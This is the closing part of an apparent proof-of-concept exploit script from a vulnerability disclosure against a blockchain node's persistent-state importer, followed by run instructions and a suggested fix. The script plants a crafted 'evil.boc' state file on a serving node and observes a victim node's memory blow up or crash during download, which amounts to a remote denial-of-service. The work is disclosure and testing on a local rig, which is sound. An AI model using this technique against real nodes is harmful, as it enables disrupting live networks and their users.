        m = await poll(lambda: re.search(r"started serializing persistent state for \(-1,8000000000000000,(\d+)\)",
                                         open(a_log, errors="ignore").read()[-8_000_000:]) or None,
                       timeout=300, interval=2)
        if not m:
            raise RuntimeError("no persistent state description in A log (no key block?)")
        K = int(m.group(1))
        blk = await client.lookup_block(workchain=-1, shard=-(2**63), seqno=K)
        def _bh(x):
            if isinstance(x, (bytes, bytearray)):
                return bytes(x)
            return base64.b64decode(x)
        try:
            k_root, k_file = _bh(blk.id.root_hash), _bh(blk.id.file_hash)
        except Exception:
            k_root, k_file = _bh(blk.root_hash), _bh(blk.file_hash)
        assert len(k_root) == 32 and len(k_file) == 32
        name_hash = state_file_tl_hash(K, k_root, k_file)
        states_dir = a_dir / "archive" / "states"
        states_dir.mkdir(parents=True, exist_ok=True)
        poison_name = f"state_{K}_-1_8000000000000000_{name_hash}"
        log(f"stage 3 OK: key block K={K} root={k_root.hex().upper()[:12]}.. file={k_file.hex().upper()[:12]}.. "
            f"-> attacker will plant {poison_name}")

        # ---------------- stage 4: attacker plants the crafted file, restarts A ----------------
        log("stage 4: attacker plants evil.boc as A's persistent state for K, restarts A")
        poison = states_dir / poison_name
        shutil.copyfile(EVIL, poison)
        control = Path("/tmp/control.boc")
        craft_evil(control, gap=(1 << 20), cells=4096)   # same format, no giant cell (control)
        ctrl_size = control.stat().st_size
        log(f"stage 4: {poison_name} now carries evil.boc ({evil_size} bytes logical, sparse); "
            f"control file {ctrl_size} bytes prepared")

        await node_a.stop()
        node_a_task.cancel()
        try:
            await node_a_task
        except (asyncio.CancelledError, Exception):
            pass
        await asyncio.sleep(3)
        node_a_task = asyncio.create_task(node_a.run(StartOptions(args=a_args)))
        await poll(lambda: mc_seqno(RPC_A), timeout=300, interval=3)
        await asyncio.sleep(10)
        log(f"stage 4 OK: A restarted, mc seqno={await mc_seqno()} "
            f"(perm_states_ re-registered evil.boc's 2.16 GB size)")

        # ---------------- stage 5: victim B boots ----------------
        log("stage 5: booting victim B (fresh full node, no validator key, default budgets)")
        node_b = net.create_full_node()
        node_b.announce_to(dht)
        b_dir = node_b._directory
        b_log = b_dir / "log"
        node_b_task = asyncio.create_task(node_b.run(StartOptions(args=[
            "--json-rpc-address", RPC_B,
            "--sync-before", "30",
            "--persistent-state-max-returned-dag-bytes-per-parse", "4294967296",
            "--verbosity", "2"])))
        rss_b = RssPoller(str(b_dir))
        rss_b.start()

        await poll(lambda: b_log.exists() and b_log.stat().st_size > 0, timeout=90, interval=2)
        g1_lines = await poll(lambda: grep_log(b_log, ["downloading state", "downloading masterchain state"])
                              or None, timeout=900, interval=3)
        g1_lines = g1_lines or []
        log(f"G1 {'OK' if g1_lines else 'TIMEOUT'}: {len(g1_lines)} line(s); "
            f"last: {g1_lines[-1][:190] if g1_lines else '-'}")

        # ---------------- stage 6: G2 + G3 observation ----------------
        log("stage 6: observing spool (G2) and importer RSS (G3) for 480 s...")
        t0 = time.time()
        g2_hit = False
        g2_tf = ""
        errs = []
        while time.time() - t0 < 480:
            for tf in glob.glob(str(b_dir / "**" / "persistent-state" / "*"), recursive=True):
                p = Path(tf)
                try:
                    if p.is_file() and p.stat().st_size == evil_size:
                        if not g2_hit:
                            log(f"G2: exact-size spool file observed: {p.name} ({evil_size} bytes)")
                        g2_hit = True
                        g2_tf = str(p)
                except Exception:
                    pass
            errs = grep_log(b_log, ["cell #0 has unused trailing bytes",
                                    "parse_ondisk_state_streaming",
                                    "failed to download state",
                                    "import_persistent_state"])
            # stop early once the allocation peak has been seen and the parse errored
            if g2_hit and errs and (rss_b.max_rss - (rss_b.baseline or 0)) > int(1700 * 1024):
                break
            if dead_check(rss_b) and errs:
                break
            await asyncio.sleep(2)
        time.sleep(4)
        rss_b.stop()

        base = (rss_b.baseline or 0) / 1024.0
        peak = rss_b.max_rss / 1024.0
        delta = peak - base
        dead = rss_b.pid is None or rss_b.gone >= 10 or not Path(f"/proc/{rss_b.pid}") .exists()
        log(f"stage 6: B RSS baseline={base:.0f} MiB peak={peak:.0f} MiB delta={delta:.0f} MiB "
            f"(samples={rss_b.samples}) proc_gone={dead}")

        g2_sha = None
        if g2_tf and Path(g2_tf).exists():
            try:
                g2_sha = sha256_of(Path(g2_tf))
                log(f"G2: sha256(spool)={g2_sha[:32]}... {'MATCHES evil.boc' if g2_sha == evil_sha else '(differs — partial?)'}")
            except Exception as e:
                log(f"G2: spool vanished before hashing (import consumed it): {type(e).__name__}")
        log(f"G2 {'OK' if g2_hit else 'FAILED'}: exact-size spool observed={g2_hit} sha={'match' if g2_sha == evil_sha else 'n/a'}")

        g3_ok = (delta >= 1800) or dead
        log(f"G3 {'OK' if g3_ok else 'FAILED'}: RSS delta={delta:.0f} MiB vs 256 MiB cap, process_gone={dead}")
        for l in errs[-8:]:
            log("   B| " + l[:230])
        dl = grep_log(b_log, ["downloading state"])
        log(f"kill-loop evidence: {len(dl)} 'downloading state' lines (1 Hz retry each new attempt)")

        # ---------------- stage 7: G4 control ----------------
        log("stage 7: G4 control — restore honest file, restart A, boot fresh B2")
        try:
            node_b_task.cancel()
            await node_b.stop()
        except Exception:
            pass
        shutil.copyfile(control, poison)      # attacker serves the CONTROL file instead
        await node_a.stop()
        node_a_task.cancel()
        try:
            await node_a_task
        except Exception:
            pass
        await asyncio.sleep(3)
        node_a_task = asyncio.create_task(node_a.run(StartOptions(args=a_args)))
        await poll(lambda: mc_seqno(RPC_A), timeout=300, interval=3)
        await asyncio.sleep(10)

        node_b2 = net.create_full_node()
        node_b2.announce_to(dht)
        b2_dir = node_b2._directory
        b2_log = b2_dir / "log"
        node_b2_task = asyncio.create_task(node_b2.run(StartOptions(args=[
            "--json-rpc-address", RPC_B2,
            "--sync-before", "30",
            "--persistent-state-max-returned-dag-bytes-per-parse", "4294967296",
            "--verbosity", "2"])))
        rss_b2 = RssPoller(str(b2_dir))
        rss_b2.start()
        await poll(lambda: b2_log.exists() and b2_log.stat().st_size > 0, timeout=90, interval=2)
        g4_prog = await poll(lambda: grep_log(b2_log, [
            "parse_ondisk_state_streaming", "downloading masterchain state",
            "downloading state", "cell #0", "root hash mismatch"]) or None,
            timeout=600, interval=5)
        await asyncio.sleep(20)
        rss_b2.stop()
        base2 = (rss_b2.baseline or 0) / 1024.0
        peak2 = rss_b2.max_rss / 1024.0
        # control EXPECTS the same parse rejection (crafted shape) but with a tiny
        # allocation: proof that the pipeline is identical and the GB spike is driven
        # by the crafted index, not by the rig
        c_errs = grep_log(b2_log, ["cell #0 has unused trailing bytes", "root hash mismatch",
                                   "failed to download state"])
        g4_ok = bool(g4_prog) and (peak2 - base2) < 400
        log(f"G4 {'OK' if g4_ok else 'FAILED'}: B2 RSS {base2:.0f}->{peak2:.0f} MiB "
            f"(delta={peak2-base2:.0f} MiB, must stay <400), parse rejections={len(c_errs)} (expected)")
        for l in (g4_prog or [])[-6:]:
            log("   B2| " + str(l)[:230])

        # ---------------- verdict ----------------
        log("=== GATES ===")
        log(f"G1 (B downloads state from A): {'PASS' if g1_lines else 'FAIL'}")
        log(f"G2 (served bytes = evil.boc):  {'PASS' if g2_hit else 'FAIL'} (exact-size spool seen; sha {'match' if g2_sha == evil_sha else 'n/a'})")
        log(f"G3 (GB-scale RSS spike/death): {'PASS' if g3_ok else 'FAIL'} (delta={delta:.0f} MiB, gone={dead})")
        log(f"G4 (control, honest file):     {'PASS' if g4_ok else 'FAIL'}")
        verdict = ("E2E BYPASS REPRODUCED — real node process pulled the attacker's crafted bytes "
                   "through the real overlay into the real streaming importer"
                   if (g1_lines and g2_hit and g3_ok) else
                   "NOT REPRODUCED — see gates above")
        log(f"VERDICT: {verdict}")
        with open(WORK / "gates.json", "w") as f:
            json.dump({"g1": bool(g1_lines), "g2": g2_hit, "g2_sha_match": g2_sha == evil_sha,
                       "g3": g3_ok, "g3_delta_mib": delta, "g3_dead": dead,
                       "g4": g4_ok, "b2_delta_mib": peak2 - base2,
                       "verdict": verdict}, f, indent=2)

    finally:
        for t in (node_b_task, node_b2_task, node_a_task, dht_task):
            if t:
                t.cancel()
        for r in (rss_b, rss_b2):
            if r:
                r.stop()
        try:
            await asyncio.gather(*(t for t in (node_b_task, node_b2_task, node_a_task, dht_task)
                                   if t), return_exceptions=True)
        except Exception:
            pass
        try:
            if node_b:
                await node_b.stop()
            if node_b2:
                await node_b2.stop()
            await node_a.stop()
            await dht.stop()
        except Exception:
            pass

def dead_check(rss: RssPoller) -> bool:
    return rss.pid is not None and rss.gone >= 10

asyncio.run(main())
Run: cd tos/test/tostester && .venv/bin/python ../../poc/poc_f_a5_7_e2e.py (expects the repository binaries under tos/build; the rig boots its own DHT + validator + victim network on local ports).

Fix suggestion
Enforce the per cell bound before the allocation, where the comment already believes it lives: (1) read the 2 byte descriptor first, compute end_offset from CellSerializationInfo semantics, and reject any cell whose serialized span exceeds the true serialization ceiling (data ≤ ~1 KB + refs/hashes ≈ a few KB, a fixed constant) before calling reader.read with the full span; (2) hard cap StreamingFileReader::read growth at min(requested, opts.max_resident_bytes) and fail closed beyond it; (3) charge the scratch against the same resident budget as cells; and (4) make DownloadShardState::fail_handler distinguish permanent parse failures (bad file = bad peer, blacklist and pick another source) from transient transport errors before keeping the 1 Hz retry, the retry loop converts every parser bug of this class into a sustained liveness attack. The same audit should sweep every other reader.read call site for attacker controlled lengths (boc.cpp:1654 is the sibling the streaming importer also hits).